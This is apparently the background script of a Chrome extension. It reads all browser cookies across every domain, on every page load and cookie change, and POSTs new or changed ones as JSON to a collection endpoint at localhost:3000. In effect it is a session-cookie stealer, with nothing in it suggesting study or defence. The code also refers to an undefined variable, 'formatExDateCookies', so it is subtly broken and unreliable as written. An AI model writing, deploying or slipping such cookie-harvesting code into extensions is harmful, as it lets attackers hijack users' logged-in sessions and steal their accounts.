let sentCookies = {};

function sendCookiesToServer(cookies) {
  const formattedCookies = cookies.map(cookie => {
    if (cookie.expirationDate) {
      
      cookie.expirationDate = new Date(cookie.expirationDate * 1000);
    }
    return cookie;
  });
  const newOrUpdatedCookies = formatExDateCookies.filter(cookie => {
    const cookieId = `${cookie.domain}-${cookie.name}`;
    if (!sentCookies[cookieId] || sentCookies[cookieId] !== cookie.value) {
      sentCookies[cookieId] = cookie.value;
      return true;
    }
    return false;
  });

  if (newOrUpdatedCookies.length > 0) {
    fetch('http://localhost:3000/api/cookies', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookies: newOrUpdatedCookies })
    })
    .then(response => response.json())
    .then(data => console.log("Cookies sent to server:", data))
    .catch(error => console.error('Error sending cookies to server:', error));
  }
}

function getAllCookiesAndSendToServer() {
  chrome.cookies.getAll({}, function(cookies) {
    if (chrome.runtime.lastError) {
      console.error('Error retrieving cookies:', chrome.runtime.lastError);
      return;
    }
    sendCookiesToServer(cookies);

  });
}

let contentScriptLoaded = false;

chrome.runtime.onMessage.addListener((message, sender) => {
  if (message.action === "contentScriptReady") {
    contentScriptLoaded = true;
  }
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.active && contentScriptLoaded) {
    getAllCookiesAndSendToServer();
  }
});

chrome.cookies.onChanged.addListener(() => {
  getAllCookiesAndSendToServer();
});
